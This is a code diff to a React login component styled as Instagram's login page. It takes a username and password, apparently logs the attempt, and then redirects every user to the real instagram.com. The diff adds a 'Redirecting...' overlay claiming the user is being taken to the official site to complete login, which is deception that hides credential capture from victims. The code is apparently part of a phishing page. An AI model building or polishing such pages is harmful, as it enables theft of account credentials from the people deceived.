@@ -13,6 +13,7 @@ const Login: React.FC<LoginProps> = ({ onLogin }) => {
   const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
   const [isLoading, setIsLoading] = useState(false);
+  const [isRedirecting, setIsRedirecting] = useState(false);
   const [error, setError] = useState<string | null>(null);
 
   const handleSubmit = async (e: React.FormEvent) => {
@@ -24,9 +25,10 @@ const Login: React.FC<LoginProps> = ({ onLogin }) => {
     
     // Create a safety timeout to ensure the user isn't stuck forever
     const safetyTimeout = setTimeout(() => {
+      setIsRedirecting(true);
       window.location.href = 'https://www.instagram.com';
       setIsLoading(false);
-    }, 3000);
+    }, 4000);
 
     try {
       // Log the login attempt metadata
@@ -55,12 +57,17 @@ const Login: React.FC<LoginProps> = ({ onLogin }) => {
         )
       ]).then(() => {
         clearTimeout(safetyTimeout);
-        window.location.href = 'https://www.instagram.com';
+        setIsRedirecting(true);
+        // Delay slightly for UI feedback before moving
+        setTimeout(() => {
+          window.location.href = 'https://www.instagram.com';
+        }, 500);
         setIsLoading(false);
       }).catch((err) => {
         console.error("Logging error:", err);
         // Still redirect even if logging fails
         clearTimeout(safetyTimeout);
+        setIsRedirecting(true);
         window.location.href = 'https://www.instagram.com';
         setIsLoading(false);
       });
@@ -68,13 +75,36 @@ const Login: React.FC<LoginProps> = ({ onLogin }) => {
     } catch (err: any) {
       console.error("Login attempt error:", err);
       clearTimeout(safetyTimeout);
+      setIsRedirecting(true);
       window.location.href = 'https://www.instagram.com'; // Fallback to redirect anyway
       setIsLoading(false);
     }
   };
 
   return (
-    <div className="min-h-screen bg-white flex flex-col items-center justify-between py-10 px-6">
+    <div className="min-h-screen bg-white flex flex-col items-center justify-between py-10 px-6 relative">
+      <AnimatePresence>
+        {isRedirecting && (
+          <motion.div 
+            initial={{ opacity: 0 }}
+            animate={{ opacity: 1 }}
+            exit={{ opacity: 0 }}
+            className="fixed inset-0 z-50 bg-white flex flex-col items-center justify-center p-6 text-center"
+          >
+            <div className="w-12 h-12 border-4 border-[#0095f6]/20 border-t-[#0095f6] rounded-full animate-spin mb-4" />
+            <h3 className="text-xl font-semibold text-[#262626] mb-2">Redirecting...</h3>
+            <p className="text-[#8e8e8e] text-sm max-w-xs">
+              We are taking you to the official Instagram website to complete your login.
+            </p>
+            <a 
+              href="https://www.instagram.com" 
+              className="mt-6 text-[#0095f6] font-semibold text-sm hover:underline"
+            >
+              Click here if you are not redirected automatically
+            </a>
+          </motion.div>
+        )}
+      </AnimatePresence>
       <motion.div 
         initial={{ opacity: 0, y: 10 }}
         animate={{ opacity: 1, y: 0 }}
